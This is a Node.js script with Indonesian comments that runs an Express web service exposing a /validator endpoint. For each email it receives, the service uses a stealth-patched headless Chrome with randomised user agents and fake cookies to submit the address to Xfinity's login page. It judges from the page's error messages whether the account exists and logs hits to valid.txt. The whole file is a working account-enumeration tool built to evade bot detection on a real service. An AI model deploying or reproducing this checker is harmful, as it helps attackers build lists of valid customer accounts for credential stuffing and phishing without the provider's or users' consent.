const express = require('express');
const expressStatusMonitor = require('express-status-monitor');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
const UserAgent = require('user-agents'); // Import user-agents

// Menggunakan Stealth Plugin
puppeteer.use(StealthPlugin());

// ANSI escape codes for coloring output
const colors = {
    reset: '\x1b[0m',
    green: '\x1b[32m',
    red: '\x1b[31m',
    yellow: '\x1b[33m',
};

// Fungsi untuk memilih User-Agent acak dari modul user-agents
function getRandomUserAgent() {
    const userAgent = new UserAgent({ deviceCategory: 'mobile' }); // Hanya untuk perangkat seluler
    return userAgent.toString();
}

// Fungsi untuk delay
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

// Fungsi untuk membuat cookie random yang lebih realistis
function generateRandomCookies() {
    const randomString = () => Math.random().toString(36).substring(2, 15); // String acak
    const cookies = [
        { name: 'session_id', value: randomString(), domain: '.xfinity.com', path: '/', httpOnly: true, secure: true },
        { name: 'user_id', value: randomString(), domain: '.xfinity.com', path: '/', httpOnly: true, secure: true },
        { name: 'csrf_token', value: randomString(), domain: '.xfinity.com', path: '/', httpOnly: true, secure: true },
        { name: 'preferences', value: 'some_preference', domain: '.xfinity.com', path: '/', secure: true },
        { name: 'locale', value: 'en-US', domain: '.xfinity.com', path: '/' },
        // Tambahkan cookie lainnya sesuai kebutuhan
    ];
    return cookies;
}

// Fungsi untuk memuat cookies random ke dalam halaman
async function setRandomCookies(page) {
    const cookies = generateRandomCookies();
    await page.setCookie(...cookies);
    console.log(`${colors.green}[INFO] Random cookies have been set successfully.${colors.reset}`);
}

// Fungsi untuk cek email terdaftar di Xfinity
async function checkEmail(email) {
    const browser = await puppeteer.launch({
        headless: true,
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--disable-software-rasterizer',
            '--no-zygote',
            '--disable-extensions',
            '--disable-background-timer-throttling',
            '--disable-background-networking',
            '--disable-default-apps',
            '--disable-translate',
            '--no-first-run',
            '--process-per-site',
            '--memory-pressure-thresholds=low'
        ],
        executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome', // Jalur ke instalasi Chrome
        slowMo: 100 // Menambahkan slow motion 100ms
    });
    const page = await browser.newPage();

    await setRandomCookies(page); // Set cookie random

    // Set User-Agent acak menggunakan modul user-agents
    const userAgent = getRandomUserAgent();
    await page.setUserAgent(userAgent);
    console.log(`${colors.green}[INFO] Random User-Agent set: ${userAgent}${colors.reset}`);

    // Menambahkan header HTTP
    await page.setExtraHTTPHeaders({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    });

    try {
        await page.goto('https://login.xfinity.com/login', { timeout: 60000 });

        // Tunggu sampai input email tersedia
        await page.waitForSelector('#user', { timeout: 10000 });
        await page.type('#user', email);

        // Tambahkan delay sebelum mengklik
        await delay(2000);

        // Tekan tombol submit
        await Promise.all([
            page.click('#sign_in'),
            page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 60000 }) // Tunggu sampai navigasi selesai
        ]);

        // Ambil konten halaman setelah klik
        const content = await page.content();

        // Cek apakah email tidak ditemukan di halaman respons
        if (content.includes('The Xfinity ID you entered was incorrect')) {
            console.log(`${colors.red}[FAILED] ${email}${colors.reset}`);
            fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke bad.txt
            return { email: email, status: 'FAILED' };
        } else if (content.includes("You don't have permission to access")) {
            console.log(`${colors.yellow}[FORBIDDEN] ${email}${colors.reset}`);
            fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke forbidden.txt
            return { email: email, status: 'FORBIDDEN' };
        } else if (content.includes('Something went wrong')) {
            console.log(`${colors.red}[ERROR] ${email}${colors.reset}`);
            fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke error.txt
            return { email: email, status: 'ERROR' };
        } else {
            console.log(`${colors.green}[SUCCESS] ${email}${colors.reset}`);
            fs.appendFileSync('valid.txt', `${email}\n`); // Simpan ke valid.txt
            return { email: email, status: 'SUCCESS' };
        }

    } finally {
        await browser.close();
    }
}

// Inisialisasi Express
const app = express();
const PORT = process.env.PORT || 3000;

// Endpoint untuk memeriksa email
app.get('/validator', async (req, res) => {
    const email = req.query.email; // Ambil email dari query parameter
    if (!email) {
        return res.send(`Email must be provided as a query parameter`);
    }
    
    // Hasil dari checkEmail bisa dilempar tanpa try-catch
    const result = await checkEmail(email);
    res.json(result);
});

// Pasang express-status-monitor sebagai middleware
app.use(expressStatusMonitor());

// Buat route untuk menampilkan dashboard monitoring
app.get('/status', (req, res) => {
    res.sendStatus(200);
});

// Menjalankan server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
